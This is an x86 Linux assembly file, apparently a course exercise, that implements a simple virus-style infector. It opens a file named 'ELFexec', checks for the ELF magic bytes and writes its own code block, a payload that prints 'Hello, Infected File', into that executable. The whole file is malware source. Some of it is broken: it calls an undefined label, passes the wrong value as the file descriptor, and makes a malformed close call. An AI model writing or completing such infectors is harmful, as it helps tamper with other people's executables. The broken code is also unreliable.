section .data
   

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    get_my_loc_infector        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
; system_call:
;     push    ebp             ; Save caller state
;     mov     ebp, esp
;     sub     esp, 4          ; Leave space for local var on stack
;     pushad                  ; Save some more caller state

;     mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
;     mov     ebx, [ebp+12]   ; Next argument...
;     mov     ecx, [ebp+16]   ; Next argument...
;     mov     edx, [ebp+20]   ; Next argument...
;     int     0x80            ; Transfer control to operating system
;     mov     [ebp-4], eax    ; Save returned value...
;     popad                   ; Restore caller state (registers)
;     mov     eax, [ebp-4]    ; place returned value where caller can see it
;     add     esp, 4          ; Restore caller state
;     pop     ebp             ; Restore caller state
;     ret                     ; Back to caller

code_start:

inf: db 'Hello, Infected File', 10, 0

infection:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, 4          ; Copy function args to registers: leftmost...        
    mov     ebx, 1          ; Next argument...
    mov     ecx, inf        ; Next argument...
    mov     edx, 22         ; Next argument...
    int     0x80            ; Transfer control to operating system

    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

file: db 'ELFexec', 0
buff: resb 4
; 0x7f,'ELF'

get_my_loc:
    call next_i
next_i:
    pop ecx
    ret

infector:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    call get_my_loc
    sub ecx, next_i - file
    
    mov     eax, 5      
    mov     ebx, ecx
    mov     ecx, 2      
    mov     edx, 0777     
    int     0x80       

    cmp eax, -1
    je end

    call get_my_loc
    sub ecx, next_i - buff

    mov     ebx, eax
    mov     eax, 3   
    mov     edx, 4
    int     0x80
    
    cmp eax, 0
    jle end   

    call get_my_loc
    sub ecx, next_i - buff

    cmp byte [ecx], 0x7f
    jne end

    inc ecx
    cmp byte [ecx], 'E'
    jne end

    inc ecx
    cmp byte [ecx], 'L'
    jne end

    inc ecx
    cmp byte [ecx], 'F'
    jne end    
    
    mov     [ebp-4], eax
    mov     eax, 4    
    mov     ebx, [ebp-4]
    mov     ecx, code_start
    mov     edx, code_end-code_start
    int     0x80

    


    mov     eax, 6  
    mov     ebx, [ebp-4]
    mov     ecx, code_start
    mov     edx, code_end-code_start
    int     0x80

    end:
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_end:
